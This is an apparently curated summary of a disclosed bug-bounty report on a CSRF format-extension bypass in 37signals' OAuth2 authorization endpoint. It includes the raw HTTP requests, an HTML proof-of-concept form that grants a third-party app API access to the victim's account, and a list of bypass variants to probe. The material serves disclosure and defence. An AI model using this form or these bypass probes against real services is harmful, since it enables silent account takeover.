# CSRF on launchpad.37signals.com OAuth2 authorization endpoint via format bypass

## Metadata
- **Source:** HackerOne
- **Report:** 850022 | https://hackerone.com/reports/850022
- **Submitted:** 2020-04-14
- **Reporter:** carbon61
- **Program:** 37signals (HackerOne)
- **Bounty:** Not specified in report
- **Severity:** critical
- **Vuln:** Cross-Site Request Forgery (CSRF), OAuth2 Authorization Bypass, Authentication Token Bypass, Format String Vulnerability
- **CVEs:** None
- **Category:** web-api

## Summary
The OAuth2 authorization endpoint on launchpad.37signals.com fails to validate CSRF tokens when requests use format extensions (.json, .xml). An attacker can craft a malicious form to silently authorize third-party applications and gain full API access to victim 37signals accounts without user interaction.

## Attack scenario
1. Attacker registers a malicious third-party application in the 37signals Integration Portal with a controlled redirect URI
2. Attacker crafts an HTML form targeting /authorization.json endpoint with the malicious client_id and redirect_uri parameters
3. Attacker hosts the form on a website or embeds it in an email/message sent to victim
4. Victim (authenticated to 37signals) visits attacker's page; form auto-submits via JavaScript without user interaction
5. Server processes /authorization.json request without validating authenticity token due to format bypass
6. Victim is silently redirected with authorization code, which attacker exchanges for access token using client_secret, gaining full API access

## Root cause
The application implements CSRF protection (authenticity token validation) on the /authorization endpoint, but the validation logic fails to apply when the request URL includes format extensions (.json, .xml). The routing or middleware likely strips format extensions before validation, or validation is conditional on content-type rather than URL format.

## Attacker mindset
An attacker would recognize that many Rails/web frameworks have inconsistent CSRF handling across different request formats. Testing format bypasses (.json, .xml, .html) is a standard technique for finding CSRF vulnerabilities. The OAuth2 context makes this particularly valuable as it grants persistent API access rather than one-time actions.

## Defensive takeaways
- Validate CSRF tokens consistently regardless of request format, extension, or content-type negotiation
- Implement CSRF protection at the routing/middleware level before any format-specific processing
- Use SameSite cookie attributes (Strict or Lax) as a defense-in-depth measure for OAuth endpoints
- Require explicit user confirmation for OAuth authorization regardless of request source
- Normalize URL paths before applying security controls; treat /endpoint.json and /endpoint identically
- Apply stricter origin/referer validation on sensitive OAuth authorization endpoints
- Test CSRF protection across all supported request formats and content-types

## Variant hunting
Test other format extensions (.xml, .pdf, .csv, .txt) on CSRF-protected endpoints
Check if trailing slashes bypass CSRF: /authorization/ vs /authorization
Test parameter pollution: adding both standard and format-based parameters
Examine other 37signals OAuth endpoints for similar format bypass vulnerabilities
Test semicolon-based parameter injection: /authorization;.json
Verify if double extensions (.json.html) or case variations (.JSON) bypass protection
Check if CORS preflight requests are exempt from CSRF validation

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1598 - Phishing
- T1566 - Phishing (via malicious form hosting)
- T1550.001 - Use Alternate Authentication Material (OAuth token abuse)

## Notes
This vulnerability is particularly severe because it affects OAuth2 authorization, which grants persistent API access rather than one-time actions. The attack requires no user interaction if automated via JavaScript, making it suitable for mass attacks. The format bypass technique is a known anti-pattern in web framework security. The attacker needs the client_secret only for token exchange, suggesting the authorization code itself becomes the primary attack vector.

## Full report
<details><summary>Expand</summary>

Hi,
I found a CSRF in the OAuth2 authorization endpoint on launchpad.37signals.com. That allows a malicious 3rd party application to gain full API access to  victim's  account in 37signals products  that uses OAuth2 authorization.

I found that when making a post request to ``` authorization ```  endpoint it does not check the "authenticity token" if you add " .json or .xml " like this "authorization.json" .

##post request:
```
POST /authorization.json HTTP/1.1
Host: launchpad.37signals.com
Connection: close
Content-Length: 168
Cache-Control: max-age=0
Origin: null
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36
Sec-Fetch-Dest: document
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _beanstalk_uuid=

client_id={your-client-id}&type=web_server&redirect_uri={your-redirect-uri}&commit=

```


After a 3rd party application gets the authorization code from redirect_uri, it can then exchange it for an access token. and get full access to the api.

## request to get the access token:

```
POST /authorization/token HTTP/1.1
Host: launchpad.37signals.com
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36
Sec-Fetch-Dest: document
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _beanstalk_uuid=
Content-Type: application/x-www-form-urlencoded
Content-Length: 214

type=web_server&client_id={your-client-id}&redirect_uri={your-redirect-uri}&client_secret={your-client-secret}&code={authorization-code}

```

## PoC:

1- you will need to register on the 37Signals Integration Portal.

2- Login to any 37Signals apps that uses the OAuth2 authorization for example basecamp 3 account. (i tested it using basecamp 3 )

3- for testing , submit the following form through the browser in which you are logged in:

```
<form action="https://launchpad.37signals.com/authorization.json" method="POST">
      <input type="hidden" name="client&#95;id" value="{your-client-id}" />
      <input type="hidden" name="client&#95;secret" value="" />
      <input type="hidden" name="type" value="web&#95;server" />
      <input type="hidden" name="redirect&#95;uri" value="{your-redirect-uri}" />
      <input type="hidden" name="commit" value="" />
      <input type="submit" value="Submit request" />
    </form>
```

you will get the {authorization-code} so you can exchange it for an access token

## Note that a real attack does not require user interaction.

## Impact

Through this vulnerability an attacker can do malicious actions on the victim's account
full API access to  victim's  account

</details>

---
*Analysed by Claude on 2026-05-24*
